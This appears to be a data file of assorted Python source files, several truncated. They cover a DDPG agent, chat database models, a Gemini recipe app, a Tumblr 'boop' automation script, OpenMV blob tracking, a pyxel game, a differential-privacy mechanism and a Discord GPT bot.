    "import numpy as np\nimport tensorflow as tf\nfrom collections import deque\nfrom sys import exit\nimport random\nimport tensorflow as tf\nfrom tensorflow.keras.layers import Input, Dense, concatenate\n\n\nclass ReplayBuffer:\n  def __init__(self, obs_dim, act_dim, size):\n    self.obs1_buf = np.zeros([size, obs_dim], dtype=np.float32)\n    self.obs2_buf = np.zeros([size, obs_dim], dtype=np.float32)\n    self.acts_buf = np.zeros([size, act_dim], dtype=np.float32)\n    self.rews_buf = np.zeros(size, dtype=np.float32)\n    self.done_buf = np.zeros(size, dtype=np.float32)\n    self.ptr, self.size, self.max_size = 0, 0, size\n\n  def store(self, obs, act, rew, next_obs, done):\n    self.obs1_buf[self.ptr] = obs\n    self.obs2_buf[self.ptr] = next_obs\n    self.acts_buf[self.ptr] = act\n    self.rews_buf[self.ptr] = rew\n    self.done_buf[self.ptr] = done\n    self.ptr = (self.ptr+1) % self.max_size\n    self.size = min(self.size+1, self.max_size)\n\n  def sample_batch(self, batch_size=32):\n    idxs = np.random.randint(0, self.size, size=batch_size)\n    return dict(s=self.obs1_buf[idxs],\n                s2=self.obs2_buf[idxs],\n                a=self.acts_buf[idxs],\n                r=self.rews_buf[idxs],\n                d=self.done_buf[idxs])\n\n\nclass BasicBuffer:\n    \n    def __init__(self, max_size):\n        self.max_size = max_size\n        self.buffer = deque(maxlen=max_size)\n\n    def push(self, state, action, reward, next_state, done):\n        experience = (state, action, np.array([reward]), next_state, done)\n        self.buffer.append(experience)\n\n    def sample(self, batch_size):\n        state_batch = []\n        action_batch = []\n        reward_batch = []\n        next_state_batch = []\n        done_batch = []\n\n        batch = random.sample(self.buffer, batch_size)\n\n        for experience in batch:\n            state, action, reward, next_state, done = experience\n            state_batch.append(state)\n            action_batch.append(action)\n            reward_batch.append(reward)\n            next_state_batch.append(next_state)\n            done_batch.append(done)\n\n        return (state_batch, action_batch, reward_batch, next_state_batch, done_batch)\n\n\ndef Critic_gen(state_size, action_size,hidden_layers):\n\n    input_x = Input(shape=state_size)\n    input_a = Input(shape=action_size)\n    x = input_x\n    for i,j in enumerate(hidden_layers[:-1]):\n        if i==1:\n            x = concatenate([x,input_a],axis=-1)\n        x = Dense(j,activation='relu')(x)\n    x = Dense(hidden_layers[-1])(x)\n    \n    return tf.keras.Model([input_x,input_a],x)\n\ndef Actor_gen(state_size, action_size, hidden_layers, action_mult=1):\n    input_x = Input(shape=state_size)\n    x = input_x\n    for i in hidden_layers:\n        x = Dense(i,activation='relu')(x)\n    x = Dense(action_size,activation='tanh')(x)\n    x = tf.math.multiply(x,action_mult)\n    return tf.keras.Model(input_x,x)\n\nclass DDPGAgent:\n    \n    def __init__(self, env, gamma, tau, buffer_maxlen, critic_learning_rate, actor_learning_rate):\n        \n        self.env = env\n        self.obs_dim = env.observation_space[\"observation\"].shape[0]\n        self.action_dim = env.action_space.shape[0]\n        self.action_max = env.action_space.high[0]\n        # self.action_max = 1\n        \n        # hyperparameters\n        self.env = env\n        self.gamma = gamma\n        self.tau = tau\n        \n        # Main network outputs\n        self.mu = Actor_gen((3),(1),[512,200,128],self.action_max)\n        self.q_mu = Critic_gen((3),(1),[1024,512,300,1])\n\n        # Target networks\n        self.mu_target = Actor_gen((3),(1),[512,200,128],self.action_max)\n        self.q_mu_target = Critic_gen((3),(1),[1024,512,300,1])\n      \n        # Copying weights in,\n        self.mu_target.set_weights(self.mu.get_weights())\n        self.q_mu_target.set_weights(self.q_mu.get_weights())\n    \n        # optimizers\n        self.mu_optimizer = tf.keras.optimizers.Adam(learning_rate=critic_learning_rate)\n        self.q_mu_optimizer = tf.keras.optimizers.Adam(learning_rate=actor_learning_rate)\n  \n        # self.replay_buffer = ReplayBuffer(obs_dim=self.obs_dim, act_dim=self.action_dim, size=buffer_maxlen)\n        self.replay_buffer = BasicBuffer(buffer_maxlen)\n        \n        self.q_losses = []\n        \n        self.mu_losses = []\n        \n    def get_action(self, s, noise_scale):\n        a =  self.mu.predict(s.reshape(1,-1))[0]\n        a += noise_scale * np.random.randn(self.action_dim)\n        return np.clip(a, -self.action_max, self.action_max)\n\n    def update(self, batch_size):\n        \n        # batch = self.replay_buffer.sample_batch(batch_size)\n        # X = batch['s']\n        # X2 = batch['s2']\n        # A = batch['a']\n        # R = batch['r']\n        # D = batch['d']\n        X,A,R,X2,D = self.replay_buffer.sample(batch_size)\n        X = np.asarray(X,dtype=np.float32)\n        A = np.asarray(A,dtype=np.float32)\n        R = np.asarray(R,dtype=np.float32)\n        X2 = np.asarray(X2,dtype=np.float32)\n        # print(R.shape)\n        \n        \n     ",
    "from sqlalchemy import Column, Integer, String, ForeignKey, Text, JSON, DateTime, Boolean\nfrom database.db import Base\nfrom datetime import datetime, timedelta\n\nfrom sqlalchemy.orm import relationship\n\n\nclass User(Base):\n    __tablename__ = \"user\"\n\n    id = Column(Integer, primary_key=True, index=True, autoincrement=True)\n    name = Column(String(255))\n    email = Column(String(255), unique=True, index=True)\n    password = Column(String(255))\n\n    sessions = relationship('Session', back_populates='user')\n\n\nclass Session(Base):\n\n    __tablename__ = \"sessions\"\n\n    id = Column(Integer, primary_key=True, index=True, autoincrement=True)\n    user_id = Column(Integer, ForeignKey('user.id'))\n    conversation_id = Column(String, nullable=False, unique=True)\n    created_at = Column(DateTime, default=datetime.now)\n    ended_at = Column(DateTime)\n    is_active = Column(Boolean, default=True)\n\n    # Relationships\n\n    user = relationship('User', back_populates='sessions')\n    messages = relationship('Message', back_populates='sessions')\n    ai_response = relationship('Ai_Response', back_populates='sessions')\n    chat_history = relationship('ChatHistory', back_populates='session',  uselist=False)\n\n\n\nclass ChatHistory(Base):\n    __tablename__ = \"chat_histories\"\n\n    id = Column(Integer, primary_key=True, index=True, autoincrement=True)\n    session_id = Column(Integer, ForeignKey('sessions.id'), unique=True)\n    chat_history = Column(JSON, default=None, nullable=False)\n\n    session = relationship('Session', back_populates='chat_history')\n\n\n\nclass Message(Base):\n\n    __tablename__ = \"messages\"\n\n    id = Column(Integer, primary_key=True, index=True, autoincrement=True)\n    session_id = Column(Integer, ForeignKey('sessions.id'))\n    text = Column(Text, nullable=False)\n    is_user_message = Column(Boolean, default=True)\n    created_at = Column(DateTime, default=datetime.now)\n\n    # Relationships\n    sessions = relationship('Session', back_populates='messages')\n    ai_response = relationship('Ai_Response', back_populates='message', uselist=False)  # One-to-one relationship\n\n\n\nclass Ai_Response(Base):\n\n    __tablename__ = 'ai_response'\n\n    id = Column(Integer, primary_key=True, index=True, autoincrement=True)\n    session_id = Column(Integer, ForeignKey('sessions.id'))\n    message_id = Column(Integer, ForeignKey('messages.id'), nullable=False)\n    text = Column(Text, nullable=False)\n    created_at = Column(DateTime, default=datetime.now)\n\n    # Relationships\n    sessions = relationship('Session', back_populates='ai_response')\n    message = relationship('Message', back_populates='ai_response')\n",
    "import streamlit as st\nimport google.generativeai as genai\nfrom dotenv import load_dotenv\nimport os\nimport vertexai\nimport re\nfrom google.cloud import texttospeech\n\nPROJECT_ID = os.getenv(\"GCP_PROJECT\")  # Your Google Cloud Project ID\nLOCATION = os.getenv(\"GCP_REGION\")  # Your Google Cloud Project Region\nvertexai.init(project=PROJECT_ID, location=LOCATION)\n\n# Load environment variables from a.env file\nload_dotenv()\n\n# Configure the generative AI model with the Google API key\ngenai.configure(api_key=os.getenv(\"GOOGLE_API_KEY\"))\n\n# Set up the model configuration for text generation\ngeneration_config = {\n    \"temperature\": 0.4,\n    \"top_p\": 1,\n    \"top_k\": 32,\n    \"max_output_tokens\": 4096,\n}\n\n# Create a GenerativeModel instance with 'gemini-pro' as the model type\nllm = genai.GenerativeModel(\n    model_name=\"gemini-pro\",\n    generation_config=generation_config,\n)\n\n# Text-to-Speech configuration\nclient = texttospeech.TextToSpeechClient.from_service_account_json(\"path/recipe-mixer.json\")\nvoice = texttospeech.VoiceSelectionParams(\n    language_code=\"en-US\", name=\"en-US-Standard-C\", ssml_gender=texttospeech.SsmlVoiceGender.FEMALE\n)\naudio_config = texttospeech.AudioConfig(audio_encoding=texttospeech.AudioEncoding.MP3)\n\nst.set_page_config(page_title=\"Recipe Mixer\", page_icon=\":cooking:\", layout=\"wide\")\n\ndef match_ingredients(user_ingredients, dietary_preferences=None):\n    \"\"\"\n    Matches ingredients with recipes using Gemini Pro (if available).\n\n    Args:\n        user_ingredients (list): List of user-provided ingredients (lowercase and stripped).\n        dietary_preferences (str, optional): User's dietary preferences (e.g., vegetarian, vegan).\n\n    Returns:\n        tuple: A tuple containing the recipe name and instructions (if found), otherwise None.\n    \"\"\"\n    \n    prompt_template = \"\"\"Find a delicious recipe using these ingredients: {ingredients}. \n    {dietary_preferences_prompt}\n    I want the response in a single structured format.\"\"\"\n\n    dietary_preferences_prompt = f\"Considering dietary restrictions: {dietary_preferences}\" if dietary_preferences else \"\"\n\n    prompt = prompt_template.format(ingredients=\", \".join(user_ingredients), dietary_preferences_prompt=dietary_preferences_prompt)\n\n    response = llm.generate_content(prompt)\n\n  # Parse the response from Gemini Pro to extract the matching recipe name and instructions (implementation depends on API response format)\n    recipe = response.text\n  # ... (code to parse response and extract recipe information)\n    return recipe\n\ndef synthesize_text(recipe):\n    \n    \"\"\"Synthesizes speech from the recipe text and returns the audio content.\"\"\"\n    cleaned_recipe = re.sub(r'[,:]|\\\\n|\\u002a', '', recipe)\n    input_text = texttospeech.SynthesisInput(text=cleaned_recipe)\n    response = client.synthesize_speech(\n      request={\"input\": input_text, \"voice\": voice, \"audio_config\": audio_config}\n    )\n    return response.audio_content\n\n# Add a logo and name at the top left\nlogo_and_name = \"\"\"\n<style>\n.logo-and-name {\n  display: flex;\n  align-items: left;\n  justify-content: flex-start;\n  padding: 5px;\n  color: white;\n  font-size: 15px;\n  font-weight: bold;\n  font-family: POPPINS;\n}\n\n.logo-and-name img {\n  width: 50px;\n  height: 50px;\n  margin-right: 10px;\n}\n</style>\n<div class=\"logo-and-name\">\n  <img src=\"https://freepngimg.com/thumb/cooking/29649-2-cooking-picture.png\" alt=\"Logo\">\n  Recipe<br>Mixer\n</div>\n\"\"\"\nst.markdown(logo_and_name, unsafe_allow_html=True)\n\nst.title(\"Recipe Mixer\" + \":cooking:\")\nst.markdown('<style>h1{color: white; text-align: center; font-family:POPPINS; font-size: 48px;}</style>', unsafe_allow_html=True)\n\nst.write(\"\")\n\nuser_ingred = st.text_input(\"Enter your ingredients (comma-separated):\", placeholder=\"e.g. chicken, rice, vegetables\")\n\n# Add dietary preference dropdown\ndietary_options = st.selectbox(\"Dietary Preferences (Optional):\", [None, \"Vegetarian\", \"Vegan\", \"Gluten-Free\"], index=0)\n\n# Center the button\nst.write('<style>div.row-widget.stButton > button {display: block; margin: auto;}</style>', unsafe_allow_html=True)\nsubmit_button = st.button(\"Suggest me a recipe\", key=\"suggest_button\")\n\nif submit_button:\n    if user_ingred is not None:\n        # Preprocess user ingredients\n        user_ingredients_str = [ingredient.strip().lower() for ingredient in user_ingred.split(\", \")]\n        \n        # Call match_ingredients once and assign results\n        recipe =  match_ingredients(user_ingredients_str, dietary_preferences=dietary_options)\n\n        if recipe:\n            complete_recipe = f\"\\n{recipe}\\n\"\n            st.write(complete_recipe.replace('\\\\n', '\\n'))\n            \n            audio_content = synthesize_text(recipe)\n\n            if audio_content:\n                with open(\"output.mp3\", \"wb\") as out:\n                    out.write(audio_content)\n\n                st.audio(audio_content, format=\"audio/mpeg\")\n        else:\n            st.write(\"No Recipe Found \ud83d\ude14\")\n\nst.write(\"\")\n\nfooter=\"\"\"<style>\na:link, a:visited{\ncolor: yellow;\nbackground-color",
    "import asyncio\n\nimport pyotp\nfrom playwright.async_api import async_playwright\n\nfrom config import ACCOUNT_EMAIL, ACCOUNT_PASSWORD, ACCOUNT_TOTP_SECRET, ACCOUNT_TO_BOOP, AMOUNT_OF_BOOPS_TO_SEND\n\n\nasync def main():\n    async with async_playwright() as playwright:\n        browser = await playwright.chromium.launch(headless=False)\n        context = await browser.new_context()\n        page = await context.new_page()\n        await page.goto(\"https://www.tumblr.com/\")\n        await page.frame_locator(\"#cmp-app-container iframe\").get_by_role(\"button\", name=\"I Agree!\").click()\n        await page.get_by_label(\"Log in\").click()\n        await page.get_by_label(\"Continue with email\").click()\n        await page.get_by_placeholder(\"Email\").click()\n        await page.get_by_placeholder(\"Email\").fill(ACCOUNT_EMAIL)\n        await page.get_by_role(\"button\", name=\"Next\").click()\n        await page.get_by_placeholder(\"Password\", exact=True).click()\n        await page.get_by_placeholder(\"Password\", exact=True).fill(ACCOUNT_PASSWORD)\n        await page.locator(\"#glass-container\").get_by_label(\"Log in\").click()\n\n        if ACCOUNT_TOTP_SECRET:\n            totp = pyotp.TOTP(ACCOUNT_TOTP_SECRET)\n            await page.get_by_placeholder(\"Enter auth code\").click()\n            await page.get_by_placeholder(\"Enter auth code\").fill(totp.now())\n            await page.locator(\"#glass-container\").get_by_label(\"Log in\").click()\n\n        await page.get_by_label(\"Account\", exact=True).wait_for()\n\n        await page.goto(f\"https://www.tumblr.com/{ACCOUNT_TO_BOOP}\")\n\n        for boop_number in range(0, AMOUNT_OF_BOOPS_TO_SEND):\n            print(f\"Sending {ACCOUNT_TO_BOOP} boop number: {boop_number+1}\")\n            await page.get_by_test_id(\"scroll-container\").get_by_label(\"Boop\").click()\n            await page.get_by_label(\"boop\", exact=True).click()\n            await asyncio.sleep(1.5)\n\n        await context.close()\n        await browser.close()\n\n\nif __name__ == '__main__':\n    asyncio.run(main())\n",
    "import sensor, image, time\r\n\r\n# \u521d\u59cb\u5316\u6444\u50cf\u5934\r\nsensor.reset()\r\nsensor.set_pixformat(sensor.RGB565)\r\nsensor.set_framesize(sensor.QVGA)\r\nsensor.skip_frames(time=2000)\r\nsensor.set_auto_gain(False)  # \u9700\u8981\u5173\u95ed\u81ea\u52a8\u589e\u76ca\r\nsensor.set_auto_whitebal(False)  # \u9700\u8981\u5173\u95ed\u81ea\u52a8\u767d\u5e73\u8861\r\n\r\n# \u5b9a\u4e49\u989c\u8272\u9608\u503c\uff08\u84dd\u8272\u548c\u7ea2\u8272\uff09\r\nblue_threshold = (0, 80, 0, 50, -80, -20)\r\nred_threshold = (50, 80, 50, 127, -10, 127)\r\n\r\nwhile True:\r\n    img = sensor.snapshot()  # \u83b7\u53d6\u56fe\u50cf\r\n\r\n    # \u5bfb\u627e\u84dd\u8272\u76ee\u6807\u5e76\u6807\u8bb0\r\n    blue_blobs = img.find_blobs([blue_threshold], pixels_threshold=200, area_threshold=200)\r\n    blue_blobs.sort(key=lambda b: b.pixels(), reverse=True)\r\n    for i in range(min(2, len(blue_blobs))):\r\n        blob = blue_blobs[i]\r\n        img.draw_rectangle(blob.rect())\r\n        img.draw_cross(blob.cx(), blob.cy(), color=(0, 0, 255))\r\n\r\n        # \u753b\u51fa\u4e0a\u70b9\u548c\u4e0b\u70b9\r\n        img.draw_circle(blob.cx(), blob.cy() - blob.h()//2, 5, color=(0, 255, 0))  # \u4e0a\u70b9\r\n        img.draw_circle(blob.cx(), blob.cy() + blob.h()//2, 5, color=(0, 255, 0))  # \u4e0b\u70b9\r\n\r\n        # \u6807\u8bb0\u5de6\u4e0a\u3001\u5de6\u4e0b\u3001\u53f3\u4e0a\u3001\u53f3\u4e0b\r\n        img.draw_string(blob.cx() - blob.w()//2, blob.cy() - blob.h()//2, \"L1\", color=(0, 255, 0))\r\n        img.draw_string(blob.cx() - blob.w()//2, blob.cy() + blob.h()//2, \"L2\", color=(0, 255, 0))\r\n\r\n    # \u5bfb\u627e\u7ea2\u8272\u76ee\u6807\u5e76\u6807\u8bb0\r\n    red_blobs = img.find_blobs([red_threshold], pixels_threshold=200, area_threshold=200)\r\n    red_blobs.sort(key=lambda b: b.pixels(), reverse=True)\r\n    for i in range(min(2, len(red_blobs))):\r\n        blob = red_blobs[i]\r\n        img.draw_rectangle(blob.rect())\r\n        img.draw_cross(blob.cx(), blob.cy(), color=(255, 0, 0))\r\n\r\n        # \u753b\u51fa\u4e0a\u70b9\u548c\u4e0b\u70b9\r\n        img.draw_circle(blob.cx(), blob.cy() - blob.h()//2, 5, color=(0, 255, 0))  # \u4e0a\u70b9\r\n        img.draw_circle(blob.cx(), blob.cy() + blob.h()//2, 5, color=(0, 255, 0))  # \u4e0b\u70b9\r\n\r\n        # \u6807\u8bb0\u5de6\u4e0a\u3001\u5de6\u4e0b\u3001\u53f3\u4e0a\u3001\u53f3\u4e0b\r\n        img.draw_string(blob.cx() - blob.w()//2, blob.cy() - blob.h()//2, \"R1\", color=(0, 255, 0))\r\n        img.draw_string(blob.cx() - blob.w()//2, blob.cy() + blob.h()//2, \"R2\", color=(0, 255, 0))\r\n\r\n",
    "# -*- coding: utf-8 -*-\n\n'''\n-> Ball Challenge\n\nStudio : I.V.L Games (Innovation, Vision and Liberty Games)\nAuteur : AMEDRO Louis (alias Osiris Sio)\n\nlicence CC BY SA\n''' \n\n######################################################\n### Importation Module :\n######################################################\n\nimport pyxel, random, time\n\n######################################################\n### Classe Personnage :\n######################################################\n\nclass Personnage() :\n    \n    def __init__(self):\n        #Position :\n        self.x = 160\n        self.y = 37\n        #Apparence :\n        self.apparence = 0\n        \n    ###Accesseur :\n    \n    def acc_x(self):\n        return self.x\n    \n    def acc_y(self):\n        return self.y\n    \n    def acc_apparence(self):\n        return self.apparence\n    \n    ###Changement apparence :\n    \n    def changement_apparence(self, valeur) :\n        self.apparence += valeur\n    \n    ###Placement :\n    \n    def placer_menu(self):\n        self.x = 160\n        self.y = 37\n        \n    def placer_partie(self):\n        self.x = 96\n        self.y = 20\n        \n    ###Mouvements :\n    \n    def gauche(self, vitesse = 1):\n        self.x -= vitesse\n        \n    def droite(self, vitesse = 1):\n        self.x += vitesse\n        \n    def haut(self, vitesse = 1):\n        self.y -= vitesse\n        \n    def bas(self, vitesse = 1):\n        self.y += vitesse\n        \n    ###Affichage :\n    \n    def afficher(self):\n        pyxel.blt(self.x, self.y, 1, 0, 8 * self.apparence, 8, 8, 0)\n        \n######################################################\n### Classe Pi\u00e8ce :\n######################################################\n\nclass Piece() :\n    \n    def __init__(self, x, y):\n        #Position :\n        self.x = x\n        self.y = y\n        \n    def collisions(self, x_perso, y_perso) :\n        tab_collisions_piece = [(-1, -1), (0, -1), (1, -1), (-1, 0), (0, 0), (1, 0), (-1, 1), (0, 1), (1, 1)]\n        i = 0\n        constat = False\n        while i < len(tab_collisions_piece) and not constat :\n            if x_perso < self.x + tab_collisions_piece[i][0] < x_perso + 8 and y_perso < self.y + tab_collisions_piece[i][1] < y_perso + 8:\n                constat = True\n            i += 1\n        return constat\n    \n    def afficher(self):\n        pyxel.circ(self.x, self.y, 1, 10)\n        \n######################################################\n### Classe balle :\n######################################################\n\nclass Balle() :\n    \n    def __init__(self, vitesse, dx, dy, apparence):\n        #Position :\n        self.x = 100\n        self.y = 50\n        #Vitesse multiplicateur:\n        self.vitesse = vitesse\n        #Directions :\n        self.dx = dx * self.vitesse\n        self.dy = dy * self.vitesse\n        #Apparence :\n        self.apparence = apparence\n        \n    ###Accesseur :\n    \n    def acc_x(self):\n        return self.x\n    \n    def acc_y(self):\n        return self.y\n        \n    ###D\u00e9placement :\n    \n    def deplacer(self):\n        self.x += self.dx\n        self.y += self.dy\n    \n    ###Rebonds :\n    \n    def collisions(self, x_elt, y_elt) :\n        tab_collisions_balle = [(-3, -3), (0, -3), (1, -3), (-3, 0), (0, 0), (3, 0), (-3, 3), (0, 3), (3, 3)]\n        i = 0\n        constat = False\n        while i < len(tab_collisions_balle) and not constat :\n            if x_elt < self.x + tab_collisions_balle[i][0] < x_elt + 8 and y_elt < self.y + tab_collisions_balle[i][1] < y_elt + 8:\n                constat = True\n            i += 1\n        return constat\n    \n    def remplacer(self, tuple_dx_dy):\n        self.dx = tuple_dx_dy[0] * self.vitesse\n        self.dy = tuple_dx_dy[1] * self.vitesse\n        pyxel.play(1, 1)\n        \n    def rebonds(self):\n        if self.x - 4 < 0 :\n            self.remplacer(random.choice([(1, -1), (2, 0), (1, 1)]))\n        if self.x + 4 > 200 :\n            self.remplacer(random.choice([(-1, -1), (-2, 0), (1, 1)]))\n        if self.y - 4 < 0 :\n            self.remplacer(random.choice([(-1, 1), (0, 1), (1, 1)]))\n        if self.y + 4 > 60 :\n            self.remplacer(random.choice([(-1, -1), (0, -1), (1, -1)]))\n            \n    def afficher(self):\n        pyxel.circ(self.x, self.y, 3, self.apparence)\n\n######################################################\n### Classe Jeu :\n######################################################\n\nclass Jeu() :\n    \n    def __init__(self) :\n        \n        #Intro :\n        self.intro = True\n        self.temps_commence_intro = time.time()\n        \n        #Menu :\n        self.menu = False\n        self.clavier = True\n        \n        #Apparence :\n        self.balle_apparence = 1\n        self.nombre_balles = 2\n        \n        #Personnage :\n        self.personnage = Personnage()\n        \n        #Partie :\n        self.temps = 0\n        self.score = 0\n        self.fin_partie = False\n        \n        #Initialisation de la fen\u00eatre Pyxel:\n        pyxel.init(200, 92, title='Ball Challenge', fps=60, capture_scale=3, capture_sec=0)\n        pyx",
    "# MIT License\n#\n# Copyright (C) IBM Corporation 2019\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated\n# documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the\n# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit\n# persons to whom the Software is furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the\n# Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE\n# WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,\n# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\"\"\"\nThe classic geometric mechanism for differential privacy, and its derivatives.\n\"\"\"\nfrom numbers import Integral\n\nimport numpy as np\n\nfrom diffprivlib.mechanisms.base import DPMechanism, TruncationAndFoldingMixin\nfrom diffprivlib.utils import copy_docstring\n\n\nclass Geometric(DPMechanism):\n    r\"\"\"\n    The classic geometric mechanism for differential privacy, as first proposed by Ghosh, Roughgarden and Sundararajan.\n    Extended to allow for non-unity sensitivity.\n\n    Paper link: https://arxiv.org/pdf/0811.2841.pdf\n\n    Parameters\n    ----------\n    epsilon : float\n        Privacy parameter :math:`\\epsilon` for the mechanism.  Must be in (0, \u221e].\n\n    sensitivity : float, default: 1\n        The sensitivity of the mechanism.  Must be in [0, \u221e).\n\n    random_state : int or RandomState, optional\n        Controls the randomness of the mechanism.  To obtain a deterministic behaviour during randomisation,\n        ``random_state`` has to be fixed to an integer.\n\n    \"\"\"\n    def __init__(self, *, epsilon, sensitivity=1, random_state=None):\n        super().__init__(epsilon=epsilon, delta=0.0, random_state=random_state)\n        self.sensitivity = self._check_sensitivity(sensitivity)\n        self._scale = - self.epsilon / self.sensitivity if self.sensitivity > 0 else - float(\"inf\")\n\n    @classmethod\n    def _check_sensitivity(cls, sensitivity):\n        if not isinstance(sensitivity, Integral):\n            raise TypeError(\"Sensitivity must be an integer\")\n\n        if sensitivity < 0:\n            raise ValueError(\"Sensitivity must be non-negative\")\n\n        return sensitivity\n\n    def _check_all(self, value):\n        super()._check_all(value)\n        self._check_sensitivity(self.sensitivity)\n\n        if not isinstance(value, Integral):\n            raise TypeError(\"Value to be randomised must be an integer\")\n\n    @classmethod\n    def _check_epsilon_delta(cls, epsilon, delta):\n        if not delta == 0:\n            raise ValueError(\"Delta must be zero\")\n\n        return super()._check_epsilon_delta(epsilon, delta)\n\n    @copy_docstring(DPMechanism.bias)\n    def bias(self, value):\n        return 0.0\n\n    @copy_docstring(DPMechanism.variance)\n    def variance(self, value):\n        self._check_all(value)\n\n        leading_factor = (1 - np.exp(self._scale)) / (1 + np.exp(self._scale))\n        geom_series = np.exp(self._scale) / (1 - np.exp(self._scale))\n\n        return 2 * leading_factor * (geom_series + 3 * (geom_series ** 2) + 2 * (geom_series ** 3))\n\n    def randomise(self, value):\n        \"\"\"Randomise `value` with the mechanism.\n\n        Parameters\n        ----------\n        value : int\n            The value to be randomised.\n\n        Returns\n        -------\n        int\n            The randomised value.\n\n        \"\"\"\n        self._check_all(value)\n\n        # Need to account for overlap of 0-value between distributions of different sign\n        unif_rv = self._rng.random() - 0.5\n        unif_rv *= 1 + np.exp(self._scale)\n        sgn = -1 if unif_rv < 0 else 1\n\n        # Use formula for geometric distribution, with ratio of exp(-epsilon/sensitivity)\n        return int(np.round(value + sgn * np.floor(np.log(sgn * unif_rv) / self._scale)))\n\n\nclass GeometricTruncated(Geometric, TruncationAndFoldingMixin):\n    r\"\"\"\n    The truncated geometric mechanism, where values that fall outside a pre-described range are mapped back to the\n    closest point within the range.\n\n    Parameters\n    ----------\n    epsilon : float\n        Privacy parameter :math:`\\epsilon` for the mechanism.  Must be in (0, \u221e].\n\n    sensitivity : float, default: 1\n        The sensitivity of the mechanism.  Must be in [0, \u221e).\n\n    lower : int\n        The lower bound of the mechanism.\n\n    upper : int\n        The upper bound of the mechanism.\n\n    random_state : int or RandomState, optional\n        Controls the randomness of the mechanism.  To obtain a deterministic behaviour during ran",
    "import asyncio\nimport signal\nfrom os import remove\nfrom json import load\nfrom io import BytesIO\nfrom aiosqlite import connect\nfrom asyncio import sleep, run\nfrom freeGPT import AsyncClient\nfrom discord.ui import Button, View\nfrom discord.ext.commands import Bot\nfrom aiohttp import ClientSession, ClientError\nfrom discord import Intents, Embed, File, Status, Activity, ActivityType, Colour\nfrom discord.app_commands import (\n    describe,\n    checks,\n    BotMissingPermissions,\n    MissingPermissions,\n    CommandOnCooldown,\n)\n\nintents = Intents.default()\nintents.message_content = True\nbot = Bot(command_prefix=\"!\", intents=intents, help_command=None)\ndb = None\nserver_memory = {}\ntextCompModels = [\"gpt3\"]\nimageGenModels = [\"prodia\"]\nbotpersonality = \"GPT-3\"\n\nasync def init_db():\n    return await connect(\"database.db\")\n\n@bot.event\nasync def on_ready():\n    print(f\"\\033[1;94m INFO \\033[0m| {bot.user} has connected to Discord.\")\n    global db\n    db = await connect(\"database.db\")\n    async with db.cursor() as cursor:\n        await cursor.execute(\n            \"CREATE TABLE IF NOT EXISTS database(guilds INTEGER, channels INTEGER, models TEXT)\"\n        )\n    print(\"\\033[1;94m INFO \\033[0m| Database connection successful.\")\n    sync_commands = await bot.tree.sync()\n    while True:\n        await bot.change_presence(\n            status=Status.online,\n            activity=Activity(\n                type=ActivityType.playing,\n                name=f\"the role of {botpersonality} | SAM v3.1\",\n            ),\n        )\n        await sleep(1)\n\n@bot.event\nasync def on_message(message):\n    global server_memory\n\n    if message.author.bot:\n        return\n\n    if not message.guild or message.content.startswith('!'):\n        return\n\n    if not bot.user.mentioned_in(message):\n        return\n\n    if \"c.image\" in message.content:\n        server_id = message.guild.id\n        image_prompt = message.content.replace(\"c.image\", \"\").strip()\n        question_to_gpt3 = f\"This is an automated prompt used for an ai moderated blacklist for an image generator, please only respond with yes or no: Is the following prompt likely to generate content that is considered NSFW (Pornographic Content or Nudity)? | Prompt: '{image_prompt}'\"\n\n        try:\n            gpt3_response = await AsyncClient.create_completion(\"gpt3\", question_to_gpt3)\n            print(gpt3_response)\n            content_safe = \"No\" in gpt3_response\n        except Exception as e:\n            print(f\"An error occurred querying GPT-3: {e}\")\n            content_safe = False\n\n        if content_safe:\n            async with message.channel.typing():\n                try:\n                    image_response = await AsyncClient.create_generation(\"prodia\", image_prompt)\n                    await message.channel.send(file=File(fp=BytesIO(image_response), filename=\"generated_image.png\"))\n                except Exception as e:\n                    print(f\"An error occurred generating image: {e}\")\n        else:\n            await message.channel.send(\"I just don't feel up to the task right now.\")\n\n    elif \"c.style\" in message.content:\n        parts = message.content.split(\"c.style\", 1)\n        if len(parts) > 1:\n            global botpersonality\n            botpersonality = parts[1].strip()\n            server_memory = {}\n            await message.channel.send(f\"Personality Set To: {botpersonality}\")\n    \n    elif \"c.help\" in message.content:\n        await message.channel.send(\"c.help: sends this message | c.refresh: refreshes server context | c.image: generates image via prodia | c.style: sets bot response style | You can also just ping me and receive a response from GPT-3\")\n\n    elif \"c.refresh\" in message.content:\n        server_memory = {}\n        await message.channel.send(\"Context Cache Reset\")\n\n    else:\n        prompt = message.content.strip()\n        server_id = message.guild.id\n        server_last_response = server_memory.get(server_id, \"\")\n        full_prompt = f\"GPT-3 Last Response: {server_last_response} |  (Ignore '@Bot User ID Here') (Respond in the style of {botpersonality}) | Current Prompt: {prompt}\".strip()\n\n        async with message.channel.typing():\n            try:\n                response = await AsyncClient.create_completion(\"gpt3\", full_prompt)\n                server_memory[server_id] = response\n                await message.channel.send(response)\n            except Exception as e:\n                print(f\"An error occurred: {e}\")\n\n    await bot.process_commands(message)\n\n\ndef graceful_exit():\n    print(\"Shutting down gracefully...\")\n    loop = asyncio.get_running_loop()\n    db_close_task = loop.create_task(db.close())\n    bot_close_task = loop.create_task(bot.close())\n    loop.run_until_complete(db_close_task)\n    loop.run_until_complete(bot_close_task)\n    loop.stop()\n\nsignal.signal(signal.SIGTERM, lambda s, f: loop.call_soon_threadsafe(graceful_exit))\n\nif __name__ == \"__main__\":\n    with open(\"config.json\", \"r\") as file:\n        config = load(file)\n    bot.run(config[\"BOT_TOKE",
